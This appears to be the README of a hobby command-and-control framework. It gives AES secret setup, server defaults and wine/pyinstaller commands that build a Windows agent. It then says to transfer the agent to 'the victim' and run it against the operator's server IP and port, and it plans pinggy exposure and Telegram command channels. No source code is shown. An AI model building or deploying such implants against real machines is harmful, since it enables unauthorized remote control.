# G-r00t C2 project

## Disclaimer

This Command and Control (C2) tool is developed solely for educational and research purposes. It is intended to help users understand the principles of C2 communication, cybersecurity testing, and network security in a controlled and lawful environment.

### Usage Policy

This tool is strictly for learning and authorized testing purposes only.
Unauthorized use against any system, network, or individual without explicit permission is illegal and strictly prohibited.

The author does not condone, endorse, or support any malicious activities. Misuse of this tool to target networks, systems, or devices without consent may result in legal consequences. The author and contributors assume no responsibility for any damages or legal issues caused by misuse.
Responsible Usage

By using this tool, you agree to use it responsibly and legally within the bounds of ethical hacking, training, or research in a controlled environment.

## Encryption setup

This C2 framework uses AES encryption for communication.
The first step is to generate the secrets (key and IV) and add them to the agent and sevrer python script. 
To generate the secrets you can use the provided secretsGenerator.py script. 

Once the secrets are generated you will need to add them to agent.py and server.py

## Server

The server by default lsiten to 0.0.0.0:4444.
You can change this in the variables host and port.
Once done you can just run it with python.

## Agent cross-compiling 

To crosscompile the agent for Windows I used wine. 
You can follow this guide to setup Python and pyinstaller in wine: 

https://www.makeworld.space/2021/10/linux-wine-pyinstaller.html

Once the environment in wine is setup you will need to install the requirements:

```
wine C:/path/to/python.exe -m pip install -r requirements.txt
```

To compile the agent you can run:

```
wine C:/path/to/Scripts/pyinstaller.exe --onefile --add-binary "C:/path//to/python38.dll;." --name agent agent.py
```

Once the agent is compiled, you will find the executable in the dist/ folder.  
You can now transfer it to the victim and use it by specifying the IP and PORT of the server:

```
agent.py <SERVER_IP> <SERVER_PORT>
```



## To do list:


## Integrate pinggy and Test Encrypted Communication

    Expose C2 Server with pinggy:
        Use pinggy to expose your C2 server with a public IP and port.
        Configure the agent to communicate with the public IP and port from pinggy, and test the secure (AES-encrypted) communication between the agent and server.

    Testing:
        Test the encryption and decryption functions separately to confirm they work correctly.
        Simulate command exchanges, ensuring that commands are encrypted by the server, decrypted by the agent, and that responses follow the same path securely.

## Implement Telegram as an Additional Channel

Since Telegram’s API is JSON-based, integrating it with a C agent is more complex. You could either:

    Write a separate Python/C# process to handle Telegram communication, then interface this with the C-based agent.
    Use a lightweight HTTP library in C (like libcurl) to directly communicate with Telegram’s API if you want a pure C solution, though it may involve considerable work parsing JSON responses.

Example Workflow for Telegram Integration

    Send Commands via Telegram:
        Write a simple server process (in Python or any high-level language) that takes commands via a Telegram bot.
        Have this server relay commands to your C2 server, which then relays encrypted commands to the C agent.

    Receive Responses via Telegram:
        Alternatively, for a pure C setup, use Telegram’s getUpdates endpoint via HTTP requests to poll for messages from the bot, then execute these commands in your C agent.

## Extra functionalities

Upload download files sunctionalities